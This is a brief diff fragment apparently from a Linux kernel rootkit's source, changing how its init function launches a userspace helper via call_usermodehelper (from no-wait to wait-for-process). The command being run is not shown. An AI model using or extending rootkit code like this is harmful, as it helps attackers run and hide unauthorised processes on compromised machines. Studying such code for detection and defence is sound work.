@@ -231,7 +231,7 @@ int rootkit_init(void) { // Start lel rootkit
         "TERM=linux",
         "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
 
-        call_usermodehelper(argv[0], argv, env, UMH_NO_WAIT);
+        call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
 	
 	return 0;
 }
